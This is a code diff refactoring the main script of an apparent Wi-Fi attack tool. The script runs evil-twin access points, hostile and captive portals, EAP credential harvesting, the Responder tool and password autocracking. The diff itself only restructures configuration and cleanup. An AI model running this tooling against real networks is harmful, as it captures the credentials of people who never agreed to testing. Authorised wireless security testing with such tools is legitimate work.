@@ -4,11 +4,14 @@ import sys
 import os
 import time
 import json
+import argparse
+import core.cli
 
 from core import cert_manager, conf_manager, utils, responder, services
 from core.servers.redirect_server import RedirectServer
 from core.autocrack import Autocrack
 from core.hostapd import HostapdEaphammer
+from core.hostapd_config import HostapdConfig
 from argparse import ArgumentParser
 from settings import settings, __version__
 
@@ -50,48 +53,25 @@ def cert_wizard():
 def hostile_portal():
     global responder
 
-
-    daemons = []
-
     try:
     
         # start autocrack if enabled
-        if options['use_autocrack']:
+        if options['autocrack']:
 
             autocrack = Autocrack.get_instance()
             autocrack.configure(wordlist=options['wordlist'])
             autocrack.start()
-            daemons.append(autocrack)
 
         # prepare environment
         utils.nmcli.set_unmanaged(options['interface'])
         utils.set_ipforward(1)
 
-        # initialize access point
-        if options['auth'] == 'open':
-            conf_manager.hostapd_open_cnf.configure(
-                        interface=options['interface'],
-                        ssid=options['essid'],
-                        hw_mode=options['hw_mode'],
-                        bssid=options['bssid'],
-                        channel=options['channel'],
-                        cloaking=options['cloaking'],
-                        karma=options['karma'],
-            )
-        else:
-            conf_manager.hostapd_wpe_cnf.configure(
-                        interface=options['interface'],
-                        ssid=options['essid'],
-                        hw_mode=options['hw_mode'],
-                        bssid=options['bssid'],
-                        channel=options['channel'],
-                        wpa=options['wpa'],
-                        karma=options['karma'],
-                        use_autocrack=options['use_autocrack'],
-                        cloaking=options['cloaking'],
-            )
+        # write hostapd config file to tmp directory
+        hostapd_conf = HostapdConfig(settings, options)
+        hostapd_conf.write()
 
-        hostapd = HostapdEaphammer(settings)
+        # start hostapd
+        hostapd = HostapdEaphammer(settings, options)
         hostapd.start()
 
         # configure routing 
@@ -107,7 +87,6 @@ def hostile_portal():
         rs = RedirectServer.get_instance()
         rs.configure('10.0.0.1')
         rs.start()
-        daemons.append(rs)
 
         # start Responder
         if options['pivot']:
@@ -115,13 +94,16 @@ def hostile_portal():
             print '[*] Pivot mode activated. Rogue SMB server disabled.'
             print ('[*] Run payload_generator to '
                         'generate a timed payload if desired.')
+
             settings.dict['core']['responder']['Responder Core']['SMB'] = 'Off'
+
         else:
+
             settings.dict['core']['responder']['Responder Core']['SMB'] = 'On'
+
         resp = responder.Responder.get_instance()
         resp.configure(interface=options['interface'])
         resp.start()
-        daemons.append(resp)
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -135,13 +117,16 @@ def hostile_portal():
         # pause execution until user quits
         raw_input('\n\nPress enter to quit...\n\n')
 
-        # kill base services
         hostapd.stop()
         services.Dnsmasq.kill()
+        rs.stop()
+        resp.stop()
+        autocrack.stop()
 
-        # stop additional daemon processes
-        for d in daemons:
-            d.stop()
+        # remove hostapd conf file from tmp directory
+        if options['save_config']:
+            hostapd_conf.save()
+        hostapd_conf.remove()
 
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -150,20 +135,22 @@ def hostile_portal():
 
         utils.Iptables.restore_rules()
 
-
         # cleanly allow network manager to regain control of interface
         utils.nmcli.set_managed(options['interface'])
 
 
     except KeyboardInterrupt:
     
-        # terminate base services
         hostapd.stop()
         services.Dnsmasq.kill()
+        rs.stop()
+        resp.stop()
+        autocrack.stop()
 
-        # stop additional daemon processes
-        for d in daemons:
-            d.stop()
+        # remove hostapd conf file from tmp directory
+        if options['save_config']:
+            hostapd_conf.save()
+        hostapd_conf.remove()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -177,8 +164,6 @@ def hostile_portal():
 
 def captive_portal():
 
-    daemons = []
-
     try:
 
         # prepare environment
@@ -186,38 +171,18 @@ def captive_portal():
         utils.nmcli.set_unmanaged(options['interface'])
 
         # start autocrack if enabled
-        if options['use_autocrack']:
+        if options['autocrack']:
 
             autocrack = Autocrack.get_instance()
             autocrack.configure(wordlist=options['wordlist'])
             autocrack.start()
-            daemons.append(autocrack)
 
-        # initialize access point
-        if options['auth'] == 'open':
-            conf_manager.hostapd_open_cnf.configure(
-                        interface=options['interface'],
-                        ssid=options['essid'],
-                        hw_mode=options['hw_mode'],
-                        bssid=options['bssid'],
-                        channel=options['channel'],
-						cloaking=options['cloaking'],
-                        karma=options['karma'],
-            )
-        else:
-            conf_manager.hostapd_wpe_cnf.configure(
-                        interface=options['interface'],
-                        ssid=options['essid'],
-                        hw_mode=options['hw_mode'],
-                        bssid=options['bssid'],
-                        channel=options['channel'],
-                        wpa=options['wpa'],
-                        karma=options['karma'],
-						cloaking=options['cloaking'],
-                        use_autocrack=options['use_autocrack'],
-            )
+        # write hostapd config file to tmp directory
+        hostapd_conf = HostapdConfig(settings, options)
+        hostapd_conf.write()
 
-        hostapd = HostapdEaphammer(settings)
+        # start hostapd
+        hostapd = HostapdEaphammer(settings, options)
         hostapd.start()
 
         # configure routing 
@@ -244,14 +209,15 @@ def captive_portal():
         # pause execution until user quits
         raw_input('\n\nPress enter to quit...\n\n')
 
-        # terminate base services
         hostapd.stop()
         services.Dnsmasq.kill()
         services.Httpd.stop()
+        autocrack.stop()
 
-        # stop additional daemon processes
-        for d in daemons:
-            d.stop()
+        # remove hostapd conf file from tmp directory
+        if options['save_config']:
+            hostapd_conf.save()
+        hostapd_conf.remove()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -265,14 +231,15 @@ def captive_portal():
 
     except KeyboardInterrupt:
 
-        # terminate base services
         hostapd.stop()
         services.Dnsmasq.kill()
-        utils.Httpd.stop()
+        services.Httpd.stop()
+        autocrack.stop()
 
-        # stop additional daemon processes
-        for d in daemons:
-            d.stop()
+        # remove hostapd conf file from tmp directory
+        if options['save_config']:
+            hostapd_conf.save()
+        hostapd_conf.remove()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -287,203 +254,57 @@ def captive_portal():
 def reap_creds():
 
     try:
-    
-        daemons = []
 
         # start autocrack if enabled
-        if options['use_autocrack']:
+        if options['autocrack']:
 
             autocrack = Autocrack.get_instance()
             autocrack.configure(wordlist=options['wordlist'])
             autocrack.start()
-            daemons.append(autocrack)
-
-        conf_manager.hostapd_wpe_cnf.configure(
-                    interface=options['interface'],
-                    ssid=options['essid'],
-                    hw_mode=options['hw_mode'],
-                    bssid=options['bssid'],
-                    channel=options['channel'],
-                    wpa=options['wpa'],
-                    karma=options['karma'],
-                    cloaking=options['cloaking'],
-                    use_autocrack=options['use_autocrack'],
-        ) 
 
         utils.nmcli.set_unmanaged(options['interface'])
-        hostapd = HostapdEaphammer(settings)
-        hostapd.start()
 
+        # write hostapd config file to tmp directory
+        hostapd_conf = HostapdConfig(settings, options)
+        hostapd_conf.write()
+
+        # start hostapd
+        hostapd = HostapdEaphammer(settings, options)
+        hostapd.start()
 
         # pause execution until user quits  
         raw_input('\n\nPress enter to quit...\n\n')
 
-        # kill hostapd
         hostapd.stop()
+        autocrack.stop()
 
-        # kill additional daemon processes
-        for d in daemons:
-            d.stop()
+        # remove hostapd conf file from tmp directory
+        if options['save_config']:
+            hostapd_conf.save()
+        hostapd_conf.remove()
 
         # cleanly allow network manager to regain control of interface
         utils.nmcli.set_managed(options['interface'])
 
     except KeyboardInterrupt:
 
-        # kill hostapd
         hostapd.stop()
+        autocrack.stop()
 
-        # kill additional daemon processes
-        for d in daemons:
-            d.stop()
+        # remove hostapd conf file from tmp directory
+        if options['save_config']:
+            hostapd_conf.save()
+        hostapd_conf.remove()
 
         # cleanly allow network manager to regain control of interface
         utils.nmcli.set_managed(options['interface'])
 
-def set_options():
+def save_config_only():
 
-
-    parser = ArgumentParser()
-
-    parser.add_argument('--cert-wizard',
-                    dest='cert_wizard',
-                    action='store_true',
-                    help=('Use this flag to create a new '
-                          'RADIUS cert for your AP'))
-
-    parser.add_argument('-i', '--interface',
-                    dest='interface',
-                    type=str,
-                    help='The phy interface on which to create the AP')
-
-    parser.add_argument('-e', '--essid',
-                    dest='essid',
-                    default='eaphammer',
-                    type=str,
-                    help='Specify access point ESSID')
-
-    parser.add_argument('-b', '--bssid',
-                    dest='bssid',
-                    default='00:11:22:33:44:00',
-                    type=str,
-                    help='Specify access point BSSID')
-
-    parser.add_argument('--hw-mode',
-                    dest='hw_mode',
-                    type=str,
-                    default='g',
-                    help='Specify access point hardware mode (default: g).')
-
-    parser.add_argument('-c', '--channel',
-                    dest='channel',
-                    type=int,
-                    default=1,
-                    help='Specify access point channel')
-
-    parser.add_argument('--wpa',
-                    dest='wpa',
-                    type=int,
-                    choices=[1, 2],
-                    default=2,
-                    help='Specify WPA type (default: 2).')
-
-    parser.add_argument('--auth',
-                    dest='auth',
-                    type=str,
-                    choices=['peap', 'ttls', 'open'],
-                    default='open',
-                    help='Specify auth type (default: open).')
-
-    parser.add_argument('--cloaking',
-					dest='cloaking',
-					choices=['none', 'full', 'zeroes'],
-					default='none',
-					help='Send empty SSID in beacons and ignore probe request '
-						 'frames that do not specify full SSID (i.e. require '
-						 'stations to know SSID). Choices: [1. none - do '
-						 'not use SSID cloaking. ] [2. full - Send empty string'
-						 ' in beacon and ignore probe requests for broadcast '
-						 'SSID ] [3. zeroes - Replace all characters in SSID '
-						 'with ASCII 0 and ignore probe requests for '
-						 'broadcast SSID.]')
-
-    parser.add_argument('--creds',
-                    dest='reap_creds',
-                    action='store_true',
-                    help='Harvest EAP creds using evil twin attack')
-
-    parser.add_argument('--hostile-portal',
-                    dest='hostile_portal',
-                    action='store_true',
-                    help='Force clients to connect to hostile portal')
-
-    parser.add_argument('--captive-portal',
-                    dest='captive_portal',
-                    action='store_true',
-                    help='Force clients to connect to a captive portal')
-
-    parser.add_argument('--pivot',
-                    dest='pivot',
-                    action='store_true',
-                    help='Use this flag to perform an indirect wireless pivot')
-
-    parser.add_argument('--karma',
-                    dest='karma',
-                    action='store_true',
-                    help='Enable karma.')
-
-    parser.add_argument('--debug',
-                    dest='debug',
-                    action='store_true',
-                    help='Enable debug output.')
-
-    parser.add_argument('--remote-autocrack',
-                    dest='remote_autocrack',
-                    metavar='hostname:port',
-                    type=str,
-                    help='Use autocrack n add with remote cracking rig.')
-
-    parser.add_argument('--wordlist',
-                    dest='wordlist',
-                    default=os.path.join(settings.dict['paths']['directories']['wordlists'], settings.dict['core']['eaphammer']['general']['default_wordlist']),
-                    type=str,
-                    help='Specify the wordlist to use with '
-                         'the autocrack feature.')
-
-    parser.add_argument('--local-autocrack',
-                    dest='local_autocrack',
-                    action='store_true',
-                    help='Use internal autocrack n add feature')
-
-    args = parser.parse_args()
-
-    options = args.__dict__
-
-    if options['cert_wizard'] == False:
-
-        if options['interface'] is None:
-        
-
-            parser.print_usage()
-            msg = (
-                '[!] Please specify a valid PHY '
-                'interface using the --interface flag'
-            )
-            print
-            print msg
-            sys.exit()
-
-    if options['remote_autocrack'] is not None:
-        print
-        print '[!] This feature has not been implemented yet.'
-        sys.exit()
-        options['use_autocrack'] = True
-    elif options['local_autocrack']:
-        options['use_autocrack'] = True
-    else: 
-        options['use_autocrack'] = False
-
-    return options
+    hostapd_conf = HostapdConfig(settings, options)
+    hostapd_conf.write()
+    hostapd_conf.save()
+    hostapd_conf.remove()
 
 def print_banner():
 
@@ -504,14 +325,19 @@ if __name__ == '__main__':
     print_banner()
     utils.Iptables.save_rules()
 
-    options = set_options()
+    #options = set_options()
+    options = core.cli.set_options()
 
     if options['debug']:
+        print '[debug] Settings:'
         print json.dumps(settings.dict, indent=4, sort_keys=True)
-
+        print '[debug] Options:'
+        print json.dumps(options, indent=4, sort_keys=True)
 
     if options['cert_wizard']:
         cert_wizard()
+    elif options['save_config_only']:
+        save_config_only()        
     elif options['captive_portal']:
         captive_portal()
     elif options['hostile_portal']:
